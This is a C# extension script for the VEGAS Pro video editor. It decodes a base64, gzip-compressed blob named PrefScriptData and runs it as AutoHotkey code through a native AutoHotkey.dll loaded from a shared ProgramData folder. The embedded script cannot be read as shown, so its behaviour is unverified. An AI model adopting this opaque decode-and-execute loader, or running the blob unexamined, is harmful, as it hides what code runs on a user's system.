using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
//using Sony.Vegas;  //old version for version <14
using ScriptPortal.Vegas; //for version 14+

public class EntryPoint {
  //string VegasDir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
  string VegasDir = Environment.GetEnvironmentVariable("PROGRAMDATA") + "\\VEGAS Pro";
  string PrefScriptData = "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";
  
  [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  static extern bool SetDllDirectory(string lpPathName);
  
  [DllImport("Autohotkey.dll", CharSet=CharSet.Unicode, CallingConvention=CallingConvention.Cdecl)]
  public static extern uint ahktextdll(
      [MarshalAs(UnmanagedType.LPWStr)] string Code,
      [MarshalAs(UnmanagedType.LPWStr)] string Options,
      [MarshalAs(UnmanagedType.LPWStr)] string Parameters);
      
  public static string Unzip(byte[] bytes) {
    using (var msi = new MemoryStream(bytes))
    using (var mso = new MemoryStream()) {
      using (var gs = new GZipStream(msi, CompressionMode.Decompress)) {
        gs.CopyTo(mso);
      }
    return Encoding.UTF8.GetString(mso.ToArray());
    }
  }
  
  public void FromVegas(Vegas vegas)
  {
    SetDllDirectory(VegasDir+"\\Script Depends");
    ahktextdll(Unzip(Convert.FromBase64String(PrefScriptData)), "", "");
  }
}